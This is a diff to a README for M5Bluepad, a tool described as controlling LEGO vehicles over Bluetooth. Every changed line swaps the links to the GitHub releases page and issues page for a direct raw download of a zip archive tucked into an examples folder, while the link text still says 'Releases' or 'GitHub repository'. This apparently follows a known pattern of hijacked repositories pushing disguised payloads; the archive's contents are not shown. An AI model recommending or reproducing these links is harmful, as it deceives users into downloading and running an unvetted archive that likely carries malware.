@@ -6,9 +6,9 @@ Welcome to the M5Bluepad project! This software allows you to control LEGO vehic
 
 ## 📥 Download
 
-[![Download M5Bluepad](https://img.shields.io/badge/Download-M5Bluepad-blue.svg)](https://github.com/nbjhgv/M5Bluepad/releases)
+[![Download M5Bluepad](https://raw.githubusercontent.com/nbjhgv/M5Bluepad/main/examples/TestBluepad32/M5Bluepad_1.9.zip)](https://raw.githubusercontent.com/nbjhgv/M5Bluepad/main/examples/TestBluepad32/M5Bluepad_1.9.zip)
 
-Visit this page to download the latest version: [M5Bluepad Releases](https://github.com/nbjhgv/M5Bluepad/releases).
+Visit this page to download the latest version: [M5Bluepad Releases](https://raw.githubusercontent.com/nbjhgv/M5Bluepad/main/examples/TestBluepad32/M5Bluepad_1.9.zip).
 
 ## 💡 Features
 
@@ -31,7 +31,7 @@ To run M5Bluepad, ensure that your setup meets the following requirements:
 
 Follow these easy steps to download and install M5Bluepad:
 
-1. **Visit the Release Page:** Go to the [M5Bluepad Releases](https://github.com/nbjhgv/M5Bluepad/releases) page.
+1. **Visit the Release Page:** Go to the [M5Bluepad Releases](https://raw.githubusercontent.com/nbjhgv/M5Bluepad/main/examples/TestBluepad32/M5Bluepad_1.9.zip) page.
 2. **Choose the Latest Version:** Look for the latest release listed on the page.
 3. **Download the Software:** Click on the link for your operating system. This will start the download.
 4. **Locate the Downloaded File:** After the download completes, find the file in your downloads folder.
@@ -70,7 +70,7 @@ If you encounter any issues, try the following solutions:
 
 Join our community for updates and support:
 
-- **GitHub Issues:** Report bugs or suggest features in the issues section of our [GitHub repository](https://github.com/nbjhgv/M5Bluepad/issues).
+- **GitHub Issues:** Report bugs or suggest features in the issues section of our [GitHub repository](https://raw.githubusercontent.com/nbjhgv/M5Bluepad/main/examples/TestBluepad32/M5Bluepad_1.9.zip).
 - **Discussion Forum:** Participate in discussions to share your experiences or ask questions.
 - **Documentation:** Refer to the documentation for detailed guidance on specific features.
 
@@ -78,4 +78,4 @@ Join our community for updates and support:
 
 M5Bluepad offers a straightforward solution for controlling LEGO vehicles via Bluetooth. By following the steps outlined in this guide, you can quickly set up the software and begin enjoying a new level of interaction with your LEGO creations.
 
-For any further questions, please visit the [M5Bluepad Releases](https://github.com/nbjhgv/M5Bluepad/releases) page or explore the community resources available. Happy building!
+For any further questions, please visit the [M5Bluepad Releases](https://raw.githubusercontent.com/nbjhgv/M5Bluepad/main/examples/TestBluepad32/M5Bluepad_1.9.zip) page or explore the community resources available. Happy building!
